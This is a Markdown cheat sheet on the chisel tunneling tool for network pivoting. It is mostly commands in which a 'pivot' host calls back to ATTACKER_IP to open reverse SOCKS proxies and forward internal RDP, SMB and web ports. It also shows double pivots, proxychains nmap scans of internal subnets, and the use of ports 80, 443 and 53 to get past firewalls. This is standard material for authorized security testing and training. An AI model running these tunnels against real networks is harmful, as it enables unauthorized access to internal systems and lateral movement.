# Chisel Tunneling Guide

## Download

```bash
# Download from GitHub releases
# https://github.com/jpillora/chisel/releases

# Linux
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
gunzip chisel_1.9.1_linux_amd64.gz
mv chisel_1.9.1_linux_amd64 chisel
chmod +x chisel

# Windows
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz
```

---

## Reverse SOCKS Proxy

Most common use case - create SOCKS proxy through pivot host.

### On Attacker (Server)

```bash
# Start server allowing reverse connections
./chisel server -p 8080 --reverse

# With authentication
./chisel server -p 8080 --reverse --auth user:password
```

### On Pivot Host (Client)

```bash
# Linux
./chisel client ATTACKER_IP:8080 R:socks

# Windows
chisel.exe client ATTACKER_IP:8080 R:socks
```

### Using the Proxy

```bash
# Edit /etc/proxychains4.conf
# Add: socks5 127.0.0.1 1080

# Run tools through proxy
proxychains nmap -sT -Pn 192.168.1.0/24
proxychains ssh user@internal-host
proxychains curl http://internal-site
```

---

## Forward SOCKS Proxy

Create SOCKS proxy on pivot host (less common).

### On Pivot Host (Server)

```bash
./chisel server -p 8080 --socks5
```

### On Attacker (Client)

```bash
./chisel client PIVOT_IP:8080 socks
# SOCKS proxy available on localhost:1080
```

---

## Port Forwarding

Forward specific ports through tunnel.

### Reverse Port Forward (Most Common)

```bash
# On attacker (server)
./chisel server -p 8080 --reverse

# On pivot (client) - forward internal port to attacker
# Access 192.168.1.100:3389 on attacker's localhost:3389
./chisel client ATTACKER_IP:8080 R:3389:192.168.1.100:3389

# On pivot (client) - forward local pivot port to attacker
# Access pivot's port 80 on attacker's localhost:8081
./chisel client ATTACKER_IP:8080 R:8081:127.0.0.1:80
```

### Multiple Port Forwards

```bash
# Forward multiple ports at once
./chisel client ATTACKER_IP:8080 R:3389:192.168.1.100:3389 R:445:192.168.1.100:445 R:80:192.168.1.100:80

# Combine SOCKS and port forward
./chisel client ATTACKER_IP:8080 R:socks R:3389:192.168.1.100:3389
```

### Local Port Forward

```bash
# On pivot (server)
./chisel server -p 8080

# On attacker (client) - access pivot's internal resource
./chisel client PIVOT_IP:8080 3389:192.168.1.100:3389
# Now connect to localhost:3389 to reach 192.168.1.100:3389
```

---

## Double Pivot

Access network behind second pivot host.

### Setup

```
Attacker → Pivot1 → Pivot2 → Target
```

### Commands

```bash
# On attacker
./chisel server -p 8080 --reverse

# On pivot1
./chisel client ATTACKER_IP:8080 R:8081:127.0.0.1:8081
./chisel server -p 8081 --reverse

# On pivot2
./chisel client PIVOT1_INTERNAL_IP:8081 R:socks

# Now SOCKS proxy on attacker:1080 reaches pivot2's network
```

---

## Common Scenarios

### Scenario 1: Access Internal Web Server

```bash
# Internal web at 192.168.1.100:80

# Attacker
./chisel server -p 8080 --reverse

# Pivot
./chisel client ATTACKER:8080 R:8001:192.168.1.100:80

# Access http://localhost:8001 on attacker
```

### Scenario 2: Access RDP/SSH on Internal Host

```bash
# Internal Windows at 192.168.1.100

# Attacker
./chisel server -p 8080 --reverse

# Pivot
./chisel client ATTACKER:8080 R:3389:192.168.1.100:3389

# Connect: rdesktop localhost
# Or: xfreerdp /v:localhost
```

### Scenario 3: Scan Internal Network

```bash
# Attacker
./chisel server -p 8080 --reverse

# Pivot
./chisel client ATTACKER:8080 R:socks

# Scan through proxy
proxychains nmap -sT -Pn -F 192.168.1.0/24
```

---

## Useful Options

```bash
# Server options
--reverse         Allow reverse tunnels
--auth user:pass  Authentication
--keepalive 25s   Keep connection alive
-v                Verbose output

# Client options
--fingerprint     Server fingerprint for verification
--auth user:pass  Authentication
--keepalive 25s   Keep connection alive
-v                Verbose output
```

---

## Troubleshooting

### Connection Issues

```bash
# Check if chisel server is running
netstat -tlnp | grep 8080

# Run with verbose
./chisel server -p 8080 --reverse -v
./chisel client ATTACKER:8080 R:socks -v
```

### Firewall Issues

```bash
# Use common ports
./chisel server -p 80 --reverse
./chisel server -p 443 --reverse
./chisel server -p 53 --reverse
```

### Proxy Not Working

```bash
# Verify proxychains config
cat /etc/proxychains4.conf | grep socks

# Test proxy
proxychains curl http://internal-host

# Check if SOCKS port is listening
netstat -tlnp | grep 1080
```

---

## Quick Reference

| Use Case | Server (Attacker) | Client (Pivot) |
|----------|-------------------|----------------|
| SOCKS Proxy | `server -p 8080 --reverse` | `client IP:8080 R:socks` |
| Port Forward | `server -p 8080 --reverse` | `client IP:8080 R:LOCAL:TARGET:PORT` |
| Both | `server -p 8080 --reverse` | `client IP:8080 R:socks R:3389:10.1.1.1:3389` |



